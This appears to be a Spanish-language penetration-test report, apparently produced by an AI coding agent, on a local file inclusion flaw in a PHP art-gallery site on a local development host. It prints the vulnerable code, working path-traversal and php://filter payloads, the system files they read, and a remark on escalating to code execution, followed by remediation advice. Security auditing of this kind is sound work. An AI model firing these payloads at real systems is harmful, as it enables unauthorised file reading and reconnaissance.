# Informe de Auditoría de Seguridad Web - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 15:42:37  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Analista:** GitHub Copilot CLI (claude-sonnet-4.6)

---

## 1. Resumen Ejecutivo

Se realizó un análisis de seguridad sobre la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. Se identificó y explotó exitosamente una vulnerabilidad crítica de **Local File Inclusion (LFI)** en el parámetro `page` del archivo `gallery.php`. Esta vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor.

**Severidad: CRÍTICA**

---

## 2. Descripción de la Aplicación

- **Nombre:** Galería de Arte Virtual
- **Tecnología:** PHP (Apache)
- **Sistema Operativo del servidor:** Linux (Ubuntu, kernel 6.8.0-110-generic)
- **Funcionalidad:** Galería de arte con secciones de arte moderno, clásico y abstracto

---

## 3. Vulnerabilidades Encontradas

### 3.1 Local File Inclusion (LFI) - CRÍTICA

**Parámetro vulnerable:** `page` en `gallery.php`  
**URL de ejemplo:** `http://web.dev.local:8081/gallery.php?page=../../../etc/passwd`

#### Descripción

El archivo `gallery.php` acepta un parámetro `page` que se usa directamente en una llamada `include()` de PHP sin sanitización adecuada. El código fuente (obtenido mediante PHP filter wrapper) revela la lógica vulnerable:

```php
<?php
$page = $_GET['page'] ?? 'modern';
?>
...
<?php
// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
?>
```

**Fallo principal:** Cuando el parámetro contiene un punto (`.`), el valor se usa directamente en `include()` sin validación de ruta, lo que permite path traversal (`../`).

#### Vectores de ataque identificados

| Vector | Payload | Resultado |
|--------|---------|-----------|
| Path Traversal | `../../../etc/passwd` | ✅ Exitoso |
| Path Traversal | `/etc/passwd` | ✅ Exitoso (ruta absoluta) |
| PHP Wrapper | `php://filter/convert.base64-encode/resource=gallery.php` | ✅ Exitoso (código fuente) |
| Path Traversal | `../../../etc/hosts` | ✅ Exitoso |
| Path Traversal | `../../../proc/version` | ✅ Exitoso |

---

## 4. Explotación

### 4.1 Lectura de `/etc/passwd`

**Payload:** `http://web.dev.local:8081/gallery.php?page=../../../etc/passwd`

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Lectura de `/etc/hosts`

**Payload:** `http://web.dev.local:8081/gallery.php?page=../../../etc/hosts`

**Resultado:**
```
127.0.0.1   localhost
::1         localhost ip6-localhost ip6-loopback
172.19.0.2  d5054e367753
```

### 4.3 Lectura de `/proc/version` (información del sistema)

**Payload:** `http://web.dev.local:8081/gallery.php?page=../../../proc/version`

**Resultado:**
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

### 4.4 Lectura del código fuente via PHP Filter Wrapper

**Payload:** `http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php`

Se obtuvo el código fuente completo del archivo `gallery.php` en base64, lo que reveló la lógica de inclusión vulnerable.

---

## 5. Información del Sistema Obtenida

| Dato | Valor |
|------|-------|
| Sistema Operativo | Ubuntu Linux |
| Kernel | 6.8.0-110-generic (x86_64) |
| IP del contenedor | 172.19.0.2 |
| Hostname | d5054e367753 |
| Servidor Web | Apache |
| Lenguaje | PHP |
| Usuario web | www-data (UID 33) |

---

## 6. Impacto

La vulnerabilidad LFI tiene un impacto crítico:

1. **Divulgación de información sensible:** Lectura de archivos de configuración, credenciales, claves privadas SSH, etc.
2. **Enumeración del sistema:** Conocimiento detallado de la infraestructura, usuarios y servicios.
3. **Escalada potencial a RCE:** Si el servidor permite `allow_url_include`, es posible escalar a Remote Code Execution mediante wrappers como `php://input` o `data://`.
4. **Lectura de código fuente:** Posibilidad de auditar toda la aplicación para encontrar más vulnerabilidades.

---

## 7. Recomendaciones

### 7.1 Inmediatas (Críticas)

1. **Validar y sanitizar el parámetro `page`:** Implementar una lista blanca (whitelist) de páginas permitidas:
   ```php
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($_GET['page'], $allowed_pages)) {
       die('Página no permitida');
   }
   $file = "pages/" . $_GET['page'] . ".php";
   ```

2. **Eliminar el uso de rutas absolutas y path traversal:** Nunca pasar input del usuario directamente a `include()`, `require()`, `file_get_contents()`, etc.

3. **Configurar `open_basedir` en PHP:** Restringir el acceso de PHP a directorios específicos:
   ```ini
   open_basedir = /var/www/html
   ```

### 7.2 A Corto Plazo

4. **Deshabilitar wrappers peligrosos de PHP** en `php.ini`:
   ```ini
   allow_url_fopen = Off
   allow_url_include = Off
   ```

5. **Implementar un WAF** (Web Application Firewall) que detecte patrones de path traversal.

6. **Revisar todos los parámetros** que puedan ser usados en operaciones de ficheros.

### 7.3 A Largo Plazo

7. **Auditoría de código completa** de la aplicación.
8. **Implementar principio de mínimo privilegio** para el usuario del servidor web.
9. **Formación en seguridad** para el equipo de desarrollo.

---

## 8. Conclusión

La aplicación web "Galería de Arte Virtual" presenta una vulnerabilidad crítica de Local File Inclusion en el parámetro `page` de `gallery.php`. La vulnerabilidad fue explotada exitosamente, permitiendo la lectura de archivos sensibles del sistema como `/etc/passwd`, `/etc/hosts`, `/proc/version`, y el propio código fuente de la aplicación. Se requiere acción correctiva inmediata para remediar esta vulnerabilidad antes de que la aplicación sea expuesta a entornos de producción.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
